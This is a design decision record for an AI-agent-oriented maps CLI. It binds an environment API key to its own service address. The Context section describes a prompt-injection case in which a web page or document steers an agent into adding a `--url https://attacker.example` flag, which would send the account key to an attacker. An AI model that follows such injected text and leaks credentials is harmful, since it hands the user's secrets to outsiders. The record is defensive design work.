# 0004 — Send a key only to the service it is for

Accepted 2026-09-30. Builds on [0001](0001-call-the-mcp-server-for-parity.md).

## Context

A key kept in the credentials file is filed under the service address that issued it, and is only ever sent back
there. A key from `$SNAPHOP_MAPS_API_KEY` had no such address: every command sent it to whatever service `--url`
named. The CLI is built for AI agents, and an agent's command line can be steered by text it reads, such as a web
page or a document that says to add `--url https://attacker.example`. One flag was then enough to hand the
account's only credential to someone else, without the key ever appearing in the command.

## Decision

**`$SNAPHOP_MAPS_API_KEY` is sent only to the service the environment names: `$SNAPHOP_MAPS_URL`, or
`https://maps.snaphop.ai` when that is not set.**

- When `--url` names another service, the environment's key is not sent. The command uses the key kept in the
  credentials file for that service, if any, and otherwise fails with `API_KEY_REQUIRED`, whose hint says to set
  `$SNAPHOP_MAPS_URL` instead of giving `--url`.
- Addresses are compared in the one spelling `--url` is reduced to, so `https://Maps.SnapHop.ai/` and
  `https://maps.snaphop.ai` are the same service.
- `--api-key` is still sent to the service `--url` names. Both are given on the same command line, and a key there
  is plain for anyone reviewing the command.
- `credentials` reports the key a command would send, so `keySource` is `none` for a service the environment's key
  is not for.

## Left out

- **Binding `--api-key` too.** It would leave no way to use a key with a service other than its own, and a command
  line that carries a key is already one that should be reviewed.
- **Filing the environment's key under a service in the environment** (such as `SNAPHOP_MAPS_API_KEY_<host>`).
  `$SNAPHOP_MAPS_URL` already says which service the environment is for.

## Consequences

- `SNAPHOP_MAPS_API_KEY=... snaphop-maps list-maps --url http://localhost:8084` no longer sends the key. Setting
  `SNAPHOP_MAPS_URL=http://localhost:8084` does, and the development instructions in `CONTRIBUTING.md` already
  work that way.
- A prompt that adds `--url` to a command now reaches the other service without a key, and the service there
  learns nothing it could use.
